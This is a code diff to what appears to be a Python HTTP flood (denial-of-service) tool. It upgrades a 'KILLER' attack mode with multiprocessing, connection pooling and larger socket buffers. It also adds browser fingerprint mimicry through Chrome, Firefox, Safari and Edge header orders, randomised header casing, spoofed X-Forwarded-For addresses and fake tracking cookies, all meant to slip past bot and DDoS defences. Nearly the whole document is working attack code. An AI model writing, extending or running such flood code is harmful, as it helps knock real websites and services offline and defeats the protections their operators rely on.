@@ -6,13 +6,15 @@ from itertools import cycle
 from json import load
 from logging import basicConfig, getLogger, shutdown
 from math import log2, trunc
-from multiprocessing import RawValue
+from multiprocessing import RawValue, Process, cpu_count
+from multiprocessing import Manager as _Mgr
 from os import urandom as randbytes
 from pathlib import Path
 from re import compile
 from random import choice as randchoice, randint
 from socket import (AF_INET, IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, IPPROTO_UDP, SOCK_DGRAM, IPPROTO_ICMP,
-                    SOCK_RAW, SOCK_STREAM, TCP_NODELAY, gethostbyname,
+                    SOCK_RAW, SOCK_STREAM, TCP_NODELAY, SOL_SOCKET, SO_SNDBUF, SO_RCVBUF,
+                    gethostbyname,
                     gethostname, socket)
 from ssl import CERT_NONE, SSLContext, create_default_context
 import ssl
@@ -20,7 +22,7 @@ from struct import pack as data_pack
 from subprocess import run, PIPE
 from sys import argv
 from sys import exit as _exit
-from threading import Event, Thread
+from threading import Event, Thread, Lock
 from time import sleep, time
 from typing import Any, List, Set, Tuple
 from urllib import parse
@@ -939,6 +941,11 @@ class HttpFlood(Thread):
             sock = socket(AF_INET, SOCK_STREAM)
 
         sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
+        try:
+            sock.setsockopt(SOL_SOCKET, SO_SNDBUF, 256 * 1024)
+            sock.setsockopt(SOL_SOCKET, SO_RCVBUF, 256 * 1024)
+        except Exception:
+            pass
         sock.settimeout(.9)
         sock.connect(host or self._raw_target)
 
@@ -1054,134 +1061,402 @@ class HttpFlood(Thread):
                 Tools.send(s, payload)
         Tools.safe_close(s)
 
-    _KILLER_METHODS = ("GET", "GET", "GET", "POST", "HEAD", "PUT")
+    # ── KILLER v3: Browser fingerprint order templates ─────────────────────
+    _KILLER_CHROME_ORDER = (
+        "host", "connection", "sec-ch-ua", "sec-ch-ua-mobile",
+        "sec-ch-ua-platform", "upgrade-insecure-requests", "user-agent",
+        "accept", "sec-fetch-site", "sec-fetch-mode", "sec-fetch-user",
+        "sec-fetch-dest", "accept-encoding", "accept-language", "cookie",
+        "referer", "x-forwarded-for", "dnt", "cache-control", "pragma",
+    )
+    _KILLER_FIREFOX_ORDER = (
+        "host", "user-agent", "accept", "accept-language",
+        "accept-encoding", "connection", "cookie",
+        "upgrade-insecure-requests", "sec-fetch-dest", "sec-fetch-mode",
+        "sec-fetch-site", "sec-fetch-user", "dnt", "referer",
+        "x-forwarded-for", "cache-control", "pragma",
+    )
+    _KILLER_SAFARI_ORDER = (
+        "host", "accept", "sec-fetch-site", "cookie", "sec-fetch-dest",
+        "sec-fetch-mode", "accept-language", "user-agent", "referer",
+        "accept-encoding", "connection", "x-forwarded-for",
+        "upgrade-insecure-requests", "cache-control",
+    )
+    _KILLER_EDGE_ORDER = (
+        "host", "connection", "sec-ch-ua", "sec-ch-ua-mobile",
+        "sec-ch-ua-platform", "upgrade-insecure-requests",
+        "accept", "user-agent", "sec-fetch-site", "sec-fetch-mode",
+        "sec-fetch-user", "sec-fetch-dest", "accept-encoding",
+        "accept-language", "cookie", "referer", "x-forwarded-for",
+        "dnt", "cache-control",
+    )
+
+    # ── KILLER v3: Browser fingerprints (UA → headers → order) ───────────
+    _KILLER_FINGERPRINTS = (
+        # Chrome 120+ on Windows 10/11
+        {"ua_prefix": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+         "order": _KILLER_CHROME_ORDER,
+         "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+         "languages": ("en-US,en;q=0.9", "en-GB,en-US;q=0.9,en;q=0.8",
+                       "de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7",
+                       "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
+                       "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7",
+                       "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
+                       "it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7",
+                       "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
+                       "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
+                       "ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7",
+                       "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
+                       "pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7",
+                       "nl-NL,nl;q=0.9,en-US;q=0.8,en;q=0.7",
+                       "sv-SE,sv;q=0.9,en-US;q=0.8,en;q=0.7"),
+         "sec_ch_ua": '"Chromium";v="120", "Google Chrome";v="120", "Not?A_Brand";v="99"',
+         "platform": '"Windows"'},
+        # Chrome 119 on macOS
+        {"ua_prefix": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
+         "order": _KILLER_CHROME_ORDER,
+         "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+         "languages": ("en-US,en;q=0.9", "en-GB,en;q=0.8",
+                       "ja-JP,ja;q=0.9,en;q=0.8",
+                       "fr-FR,fr;q=0.9,en;q=0.8",
+                       "de-DE,de;q=0.9,en;q=0.8"),
+         "sec_ch_ua": '"Not_A Brand";v="8", "Chromium";v="119", "Google Chrome";v="119"',
+         "platform": '"macOS"'},
+        # Chrome 120 on Linux
+        {"ua_prefix": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
+         "order": _KILLER_CHROME_ORDER,
+         "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+         "languages": ("en-US,en;q=0.9", "en-GB,en;q=0.8",
+                       "pt-BR,pt;q=0.9,en;q=0.8"),
+         "sec_ch_ua": '"Chromium";v="120", "Google Chrome";v="120", "Not?A_Brand";v="24"',
+         "platform": '"Linux"'},
+        # Firefox 121 on Windows
+        {"ua_prefix": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101",
+         "order": _KILLER_FIREFOX_ORDER,
+         "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+         "languages": ("en-US,en;q=0.5", "en-US,en;q=0.9",
+                       "de-DE,de;q=0.9,en-US;q=0.8",
+                       "fr-FR,fr;q=0.9,en-US;q=0.8",
+                       "es-ES,es;q=0.9,en;q=0.5",
+                       "it-IT,it;q=0.9,en;q=0.5"),
+         "sec_ch_ua": None, "platform": None},
+        # Firefox 121 on macOS
+        {"ua_prefix": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101",
+         "order": _KILLER_FIREFOX_ORDER,
+         "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+         "languages": ("en-US,en;q=0.5", "ja-JP,ja;q=0.7,en;q=0.3"),
+         "sec_ch_ua": None, "platform": None},
+        # Firefox 121 on Linux
+        {"ua_prefix": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101",
+         "order": _KILLER_FIREFOX_ORDER,
+         "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+         "languages": ("en-US,en;q=0.5", "en-GB,en;q=0.5"),
+         "sec_ch_ua": None, "platform": None},
+        # Safari 17 on macOS
+        {"ua_prefix": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/605.1.15",
+         "order": _KILLER_SAFARI_ORDER,
+         "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+         "languages": ("en-US,en;q=0.9", "en-GB,en;q=0.8",
+                       "fr-FR,fr;q=0.9"),
+         "sec_ch_ua": None, "platform": None},
+        # Safari 17 on iPhone
+        {"ua_prefix": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15",
+         "order": _KILLER_SAFARI_ORDER,
+         "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+         "languages": ("en-US,en;q=0.9", "en-GB,en;q=0.8"),
+         "sec_ch_ua": None, "platform": None},
+        # Edge 120 on Windows
+        {"ua_prefix": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+         "order": _KILLER_EDGE_ORDER,
+         "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+         "languages": ("en-US,en;q=0.9", "en-GB,en-US;q=0.9,en;q=0.8"),
+         "sec_ch_ua": '"Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"',
+         "platform": '"Windows"'},
+    )
+
+    # ── KILLER v3: Request pattern profiles (browser mimicry) ─────────────
+    _KILLER_PROFILES = (
+        ("PAGE_LOAD", (
+            ("GET", "/"),
+            ("GET", "/style.css"),
+            ("GET", "/app.js"),
+            ("GET", "/favicon.ico"),
+        )),
+        ("API_CALL", (
+            ("GET", "/api/v1/data"),
+            ("POST", "/api/v1/track"),
+            ("GET", "/api/v1/user"),
+        )),
+        ("SEARCH", (
+            ("GET", "/search?q={rand}"),
+            ("GET", "/results"),
+            ("GET", "/suggest?q={rand}"),
+        )),
+        ("MOBILE", (
+            ("GET", "/"),
+            ("POST", "/api/poll"),
+            ("GET", "/manifest.json"),
+        )),
+        ("RAW_FLOOD", None),
+    )
+
     _KILLER_PATHS = (
         "/?page=%d", "/search?q=%s", "/api/v1/%s", "/static/%s",
         "/images/%s", "/assets/%s", "/data/%s", "/feed/%s",
         "/index.html?%s=%s", "/%s", "/%s/%s",
+        "/css/%s", "/js/%s", "/fonts/%s", "/media/%s",
+        "/downloads/%s", "/uploads/%s", "/content/%s",
+        "/v2/%s", "/v3/%s", "/rest/%s", "/graphql",
+        "/wp-admin/%s", "/wp-content/%s", "/wp-includes/%s",
+        "/blog/%s", "/news/%s", "/articles/%s", "/posts/%s",
     )
-    _KILLER_EXTRAS = (
-        "DNT: 1\r\n",
-        "Sec-Ch-Ua: \"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"\r\n"
-        "Sec-Ch-Ua-Mobile: ?0\r\n"
-        "Sec-Ch-Ua-Platform: \"Windows\"\r\n",
-        "Sec-Ch-Ua: \"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"119\", \"Chromium\";v=\"119\"\r\n"
-        "Sec-Ch-Ua-Mobile: ?0\r\n"
-        "Sec-Ch-Ua-Platform: \"macOS\"\r\n",
-        "Sec-Ch-Ua: \"Brave\";v=\"119\", \"Chromium\";v=\"119\", \"Not?A_Brand\";v=\"24\"\r\n"
-        "Sec-Ch-Ua-Mobile: ?0\r\n"
-        "Sec-Ch-Ua-Platform: \"Linux\"\r\n",
-        "Priority: u=1, i\r\n",
-        "X-Requested-With: XMLHttpRequest\r\n",
-        "DNT: 1\r\nPriority: u=0, i\r\n",
-    )
+
+    # ── KILLER v3: Random casing for non-critical headers ─────────────────
+    _KILLER_CASABLE = frozenset((
+        "accept", "accept-encoding", "accept-language", "connection",
+        "cache-control", "dnt", "pragma", "sec-fetch-dest",
+        "sec-fetch-mode", "sec-fetch-site", "sec-fetch-user",
+        "upgrade-insecure-requests", "sec-gpc", "priority",
+        "sec-ch-ua-mobile", "sec-ch-ua-platform", "x-requested-with",
+    ))
 
     def KILLER(self) -> None:
         global REQUESTS_SENT, BYTES_SEND
-        max_workers = min(self._rpc * 10, 500)
-        burst_size = max(max_workers // 4, 10)
-        calm_delay = max(0.05, 1.0 / max_workers)
-        burst_delay = 0.0005
-        with ThreadPoolExecutor(max_workers=max_workers) as pool:
-            while True:
-                for _ in range(burst_size):
-                    pool.submit(self._killer_worker)
-                sleep(burst_delay)
-                for _ in range(burst_size // 3):
-                    pool.submit(self._killer_worker)
-                sleep(calm_delay)
+        num_processes = max(1, min(cpu_count(), max(self._rpc, 1)))
+        rpc_per_process = max(self._rpc // num_processes, 1)
+        workers_per_process = min(rpc_per_process * 10, 500)
 
-    def _killer_worker(self) -> None:
-        for attempt in range(3):
-            s = None
+        procs = []
+        for _ in range(num_processes):
+            p = Process(
+                target=self._killer_process_main,
+                args=(workers_per_process, rpc_per_process),
+                daemon=True,
+            )
+            p.start()
+            procs.append(p)
+        for p in procs:
+            p.join()
+
+    def _killer_process_main(self, max_workers: int, rpc: int) -> None:
+        from random import uniform
+
+        conn_pool = []
+        conn_lock = Lock()
+        pool_lock = Lock()
+        active = True
+
+        def refill_pool():
+            while active:
+                with pool_lock:
+                    if len(conn_pool) >= max_workers:
+                        break
+                try:
+                    s = self.open_connection()
+                    with pool_lock:
+                        conn_pool.append(s)
+                except Exception:
+                    sleep(0.01)
+                    break
+
+        def get_connection():
+            with pool_lock:
+                if conn_pool:
+                    return conn_pool.pop()
             try:
-                s = self.open_connection()
-                for _ in range(self._rpc):
-                    payload = self._killer_payload()
+                return self.open_connection()
+            except Exception:
+                return None
+
+        def return_connection(s):
+            if s is None:
+                return
+            with pool_lock:
+                if len(conn_pool) < max_workers:
+                    conn_pool.append(s)
+                    return
+            Tools.safe_close(s)
+
+        refill_pool()
+
+        base_delay = max(0.0005, 1.0 / max(max_workers, 1))
+        with ThreadPoolExecutor(max_workers=max_workers) as pool:
+            while active:
+                refill_pool()
+                burst = max(max_workers // 4, 10)
+                for _ in range(burst):
+                    pool.submit(self._killer_worker_v3,
+                                get_connection, return_connection, rpc)
+                sleep(base_delay * uniform(0.3, 1.0))
+                for _ in range(max(burst // 3, 5)):
+                    pool.submit(self._killer_worker_v3,
+                                get_connection, return_connection, rpc)
+                sleep(base_delay * uniform(1.5, 4.0))
+
+    def _killer_worker_v3(self, get_conn, return_conn, rpc: int) -> None:
+        from random import uniform, choice as rc
+
+        fp = rc(self._KILLER_FINGERPRINTS)
+        profile_name, profile_steps = rc(self._KILLER_PROFILES)
+
+        s = get_conn()
+        if s is None:
+            return
+
+        try:
+            if profile_steps and profile_name != "RAW_FLOOD":
+                for method, path in profile_steps:
+                    path = path.replace("{rand}",
+                                        ProxyTools.Random.rand_str(8))
+                    payload = self._killer_build_request(method, path, fp)
                     if not Tools.send(s, payload):
                         break
-                    if randchoice([True, False]):
-                        sleep(randchoice([0.001, 0.005, 0.01]))
-                break
-            except Exception:
-                sleep(0.05 * (attempt + 1))
-            finally:
-                Tools.safe_close(s)
+                    sleep(uniform(0.01, 0.08))
+            else:
+                batch = min(rpc, randint(5, 15))
+                for _ in range(batch):
+                    payload = self._killer_payload_v3(fp)
+                    if not Tools.send(s, payload):
+                        break
+                    if rc([True, False, False]):
+                        sleep(uniform(0.0005, 0.005))
 
-    def _killer_payload(self) -> bytes:
-        http_method = randchoice(self._KILLER_METHODS)
+            return_conn(s)
+        except Exception:
+            Tools.safe_close(s)
+
+    def _killer_build_request(self, method: str, path: str, fp: dict) -> bytes:
+        from random import randint, choice as rc
+
+        headers = {}
+        headers["host"] = self._target.authority
+        headers["user-agent"] = rc(self._useragents)
+
+        if fp.get("sec_ch_ua"):
+            headers["sec-ch-ua"] = fp["sec_ch_ua"]
+            headers["sec-ch-ua-mobile"] = "?0"
+            headers["sec-ch-ua-platform"] = fp["platform"]
+
+        headers["accept"] = fp["accept"]
+        headers["accept-language"] = rc(fp["languages"])
+        headers["accept-encoding"] = rc((
+            "gzip, deflate, br", "gzip, deflate",
+            "gzip, deflate, br, zstd"))
+        headers["x-forwarded-for"] = ProxyTools.Random.rand_ipv4()
+
+        if method == "POST":
+            rand_data = ProxyTools.Random.rand_str(randint(16, 128))
+            headers["content-type"] = rc((
+                "application/x-www-form-urlencoded",
+                "application/json"))
+            headers["content-length"] = str(len(rand_data) + 5)
+
+        if rc([True, False]):
+            headers["connection"] = "keep-alive"
+        if rc([True, False]):
+            headers["dnt"] = "1"
+        if rc([True, True, False]):
+            headers["cache-control"] = rc(("no-cache", "no-store, must-revalidate"))
+
+        cookie = self._killer_rand_cookie()
+        if cookie:
+            headers["cookie"] = cookie
+
+        if rc([True, False]):
+            headers["sec-fetch-dest"] = rc(("document", "empty", "script"))
+            headers["sec-fetch-mode"] = rc(("navigate", "cors", "same-origin"))
+            headers["sec-fetch-site"] = rc(("none", "same-origin", "cross-site"))
+            headers["sec-fetch-user"] = "?1"
+
+        if rc([True, False]):
+            headers["upgrade-insecure-requests"] = "1"
+
+        if rc([True, False]):
+            headers["sec-gpc"] = "1"
+
+        if rc([True, False]):
+            headers["pragma"] = "no-cache"
+
+        if rc([True, False, False, False]):
+            ref = rc(self._referers)
+            headers["referer"] = "%s%s" % (ref, parse.quote(self._target.human_repr()))
+
+        order = fp["order"]
+        ordered = []
+        for key in order:
+            if key in headers:
+                ordered.append((key, headers.pop(key)))
+        for key, val in headers.items():
+            ordered.append((key, val))
+
+        parts = ["%s %s HTTP/1.1\r\n" % (method, path)]
+        for name, val in ordered:
+            parts.append(self._killer_cased_header(name, val))
+        parts.append("\r\n")
+
+        if method == "POST":
+            parts.append("data=%s" % ProxyTools.Random.rand_str(randint(16, 128)))
+
+        return str.encode("".join(parts))
+
+    def _killer_payload_v3(self, fp: dict) -> bytes:
+        from random import uniform, choice as rc
+
+        method = rc(("GET", "GET", "GET", "POST", "HEAD", "PUT"))
         rand_path = self._killer_rand_path()
-        rand_ua = randchoice(self._useragents)
-        rand_ref = randchoice(self._referers)
-        rand_extra = randchoice(self._KILLER_EXTRAS)
+        cookie = self._killer_rand_cookie()
         spoof = ProxyTools.Random.rand_ipv4()
-        rand_cookie = self._killer_rand_cookie()
-        rand_dnt = randchoice([True, False])
 
-        headers = [
-            "%s %s HTTP/1.1\r\n" % (http_method, rand_path),
+        parts = [
+            "%s %s HTTP/1.1\r\n" % (method, rand_path),
             "Host: %s\r\n" % self._target.authority,
-            "User-Agent: %s\r\n" % rand_ua,
-            "Accept: %s\r\n" % randchoice([
-                "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-                "*/*",
-                "text/plain,text/html,*/*",
-            ]),
-            "Accept-Language: %s\r\n" % randchoice([
-                "en-US,en;q=0.9",
-                "en-GB,en-US;q=0.9,en;q=0.8",
-                "en-US,en;q=0.9,pt;q=0.8",
-                "de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7",
-                "ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7",
-                "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
-            ]),
-            "Accept-Encoding: %s\r\n" % randchoice([
-                "gzip, deflate, br",
-                "gzip, deflate",
-                "gzip, deflate, br, zstd",
-            ]),
+            "User-Agent: %s\r\n" % rc(self._useragents),
+            "Accept: %s\r\n" % rc(fp["accept"]),
+            "Accept-Language: %s\r\n" % rc(fp["languages"]),
+            "Accept-Encoding: %s\r\n" % rc((
+                "gzip, deflate, br", "gzip, deflate",
+                "gzip, deflate, br, zstd")),
             "X-Forwarded-For: %s\r\n" % spoof,
-            "X-Forwarded-Proto: https\r\n",
-            "X-Forwarded-Host: %s\r\n" % self._target.raw_host,
-            "Via: %s\r\n" % spoof,
-            "Client-IP: %s\r\n" % spoof,
-            "Real-IP: %s\r\n" % spoof,
-            "Referrer: %s%s\r\n" % (rand_ref, parse.quote(self._target.human_repr())),
         ]
 
-        if rand_dnt:
-            headers.append("DNT: 1\r\n")
-        if rand_cookie:
-            headers.append("Cookie: %s\r\n" % rand_cookie)
-        headers.append(rand_extra)
+        if cookie:
+            parts.append("Cookie: %s\r\n" % cookie)
+        if rc([True, False]):
+            parts.append("DNT: 1\r\n")
+        if rc([True, False]):
+            parts.append("Cache-Control: %s\r\n" % rc(("no-cache", "no-store")))
+        if rc([True, False]):
+            parts.append("Connection: keep-alive\r\n")
+        if rc([True, False]):
+            parts.append("Sec-Fetch-Dest: document\r\n")
+            parts.append("Sec-Fetch-Mode: navigate\r\n")
+            parts.append("Sec-Fetch-Site: none\r\n")
+            parts.append("Sec-Fetch-User: ?1\r\n")
+        if rc([True, False]):
+            parts.append("Upgrade-Insecure-Requests: 1\r\n")
+        if rc([True, False]):
+            ref = rc(self._referers)
+            parts.append("Referer: %s%s\r\n" % (ref, parse.quote(self._target.human_repr())))
 
-        if http_method == "POST":
-            rand_data = ProxyTools.Random.rand_str(randchoice([16, 32, 64, 128]))
-            headers.append("Content-Type: application/x-www-form-urlencoded\r\n")
-            headers.append("Content-Length: %d\r\n" % (len(rand_data) + 5))
-            headers.append("\r\n")
-            headers.append("data=%s" % rand_data)
-            return str.encode("".join(headers))
+        parts.append("\r\n")
 
-        if randchoice([True, False]):
-            headers.append("Cache-Control: no-cache\r\n")
-        if randchoice([True, False]):
-            headers.append("Connection: keep-alive\r\n")
-        if randchoice([True, False]):
-            headers.append("Sec-Fetch-Dest: document\r\n")
-            headers.append("Sec-Fetch-Mode: navigate\r\n")
-            headers.append("Sec-Fetch-Site: none\r\n")
-            headers.append("Sec-Fetch-User: ?1\r\n")
-        if randchoice([True, False]):
-            headers.append("Upgrade-Insecure-Requests: 1\r\n")
-        if randchoice([True, False]):
-            headers.append("Sec-Gpc: 1\r\n")
-        if randchoice([True, False]):
-            headers.append("Pragma: no-cache\r\n")
+        if method == "POST":
+            rand_data = ProxyTools.Random.rand_str(randint(32, 128))
+            parts.insert(-1, "Content-Type: application/json\r\n")
+            parts.insert(-1, "Content-Length: %d\r\n" % (len(rand_data) + 16))
+            parts.append('{"data":"%s"}' % rand_data)
 
-        headers.append("\r\n")
-        return str.encode("".join(headers))
+        return str.encode("".join(parts))
+
+    @staticmethod
+    def _killer_cased_header(name: str, value: str) -> str:
+        if name.lower() in HttpFlood._KILLER_CASABLE:
+            variant = randint(0, 2)
+            if variant == 0:
+                name = name.lower()
+            elif variant == 1:
+                name = name.title()
+        return "%s: %s\r\n" % (name, value)
 
     def _killer_rand_path(self) -> str:
         tmpl = randchoice(self._KILLER_PATHS)
@@ -1195,15 +1470,25 @@ class HttpFlood(Thread):
     def _killer_rand_cookie(self) -> str:
         parts = []
         if randchoice([True, False, False]):
-            parts.append("_ga=GA1.2.%d.%d" % (randint(10000000, 99999999), randint(1000000000, 1999999999)))
+            parts.append("_ga=GA1.2.%d.%d" % (randint(10000000, 99999999),
+                                               randint(1000000000, 1999999999)))
         if randchoice([True, False, False]):
-            parts.append("_gid=GA1.2.%d.%d" % (randint(10000000, 99999999), randint(1000000000, 1999999999)))
+            parts.append("_gid=GA1.2.%d.%d" % (randint(10000000, 99999999),
+                                                 randint(1000000000, 1999999999)))
         if randchoice([True, False]):
             parts.append("__cfduid=%s" % ProxyTools.Random.rand_str(43))
         if randchoice([True, False, False, False]):
             parts.append("session=%s" % ProxyTools.Random.rand_str(32))
         if randchoice([True, False, False, False, False]):
-            parts.append("_fbp=fb.1.%d.%d" % (randint(1000000000, 1999999999), randint(100000000, 999999999)))
+            parts.append("_fbp=fb.1.%d.%d" % (randint(1000000000, 1999999999),
+                                                randint(100000000, 999999999)))
+        if randchoice([True, False, False, False, False, False]):
+            parts.append("_gcl_au=%s" % ProxyTools.Random.rand_str(22))
+        if randchoice([True, False, False, False, False, False, False]):
+            parts.append("csrftoken=%s" % ProxyTools.Random.rand_str(40))
+        if randchoice([True, False, False, False, False, False, False, False]):
+            parts.append("intercom-session-%s=%s" % (
+                ProxyTools.Random.rand_str(8), ProxyTools.Random.rand_str(180)))
         return "; ".join(parts) if parts else ""
 
     def GET(self) -> None:
